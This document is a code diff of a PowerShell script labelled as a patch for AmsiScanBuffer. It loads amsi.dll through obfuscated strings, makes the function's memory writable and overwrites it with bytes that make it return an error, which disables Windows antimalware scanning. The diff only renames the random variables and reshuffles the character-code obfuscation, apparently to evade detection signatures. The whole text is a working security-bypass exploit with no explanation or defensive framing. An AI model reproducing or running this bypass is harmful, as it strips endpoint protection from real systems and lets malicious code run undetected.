@@ -1,24 +1,28 @@
 #Rasta-mouses Amsi-Scan-Buffer patch \n
-$iebnk = @"
+$ftnax = @"
 using System;
 using System.Runtime.InteropServices;
-public class iebnk {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr coflxb, uint flNewProtect, out uint lpflOldProtect);
+public class ftnax {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr fsiwaf, uint flNewProtect, out uint lpflOldProtect);
 }
-"@ Add-Type $iebnk $zirtgei = [iebnk]::LoadLibrary("$(('âms'+'ì.d'+'ll').NoRMaLIzE([ChAR]([bYTe]0x46)+[cHaR](111)+[Char]([bytE]0x72)+[chAR](109)+[char]([byte]0x44)) -replace [cHAR]([BYTe]0x5c)+[CHAr](55+57)+[ChAr]([BYtE]0x7b)+[ChAR](77*7/7)+[chaR]([ByTE]0x6e)+[CHAR]([bYTE]0x7d))")
-$qftryt = [iebnk]::GetProcAddress($zirtgei, "$([cHAr]([BYTE]0x41)+[CHar]([bYte]0x6d)+[CHaR](115*57/57)+[Char](105*31/31)+[chAR]([BYte]0x53)+[ChAr]([byTe]0x63)+[CHaR](97+10-10)+[char](82+28)+[CHAR]([BytE]0x42)+[chAr]([BYtE]0x75)+[CHaR]([bYTe]0x66)+[CHAR]([BYTe]0x66)+[Char](101+19-19)+[ChAr](44+70))")
+"@
+
+Add-Type $ftnax
+
+$xzwhyfx = [ftnax]::LoadLibrary("$(('ã'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').nORMaliZe([char](70)+[cHAR]([ByTE]0x6f)+[ChAR](114*15/15)+[CHAR]([ByTE]0x6d)+[ChAR]([BytE]0x44)) -replace [ChAr](92*49/49)+[cHaR](112)+[chAr]([BYTE]0x7b)+[chAR](77+18-18)+[ChaR](110+60-60)+[cHAR]([BytE]0x7d))")
+$mjxytf = [ftnax]::GetProcAddress($xzwhyfx, "$(('ÃmsíScânBuff'+'er').nORmAlIzE([Char](70+9-9)+[CHar](111)+[cHAr]([bYTe]0x72)+[chaR](109*88/88)+[cHAR](68+42-42)) -replace [cHAR](92*17/17)+[chaR](112*23/23)+[cHar](123*15/15)+[Char](77)+[cHAR](110+55-55)+[CHAr]([BYte]0x7d))")
 $p = 0
-[iebnk]::VirtualProtect($qftryt, [uint32]5, 0x40, [ref]$p)
-$jgve = "0xB8"
-$cvwn = "0x57"
-$wmvv = "0x00"
-$osgj = "0x07"
-$zswr = "0x80"
-$tphb = "0xC3"
-$wxuzf = [Byte[]] ($jgve,$cvwn,$wmvv,$osgj,+$zswr,+$tphb)
-[System.Runtime.InteropServices.Marshal]::Copy($wxuzf, 0, $qftryt, 6)
+[ftnax]::VirtualProtect($mjxytf, [uint32]5, 0x40, [ref]$p)
+$tgbd = "0xB8"
+$kmqv = "0x57"
+$rrjs = "0x00"
+$rtyu = "0x07"
+$jrmn = "0x80"
+$qyft = "0xC3"
+$picgj = [Byte[]] ($tgbd,$kmqv,$rrjs,$rtyu,+$jrmn,+$qyft)
+[System.Runtime.InteropServices.Marshal]::Copy($picgj, 0, $mjxytf, 6)
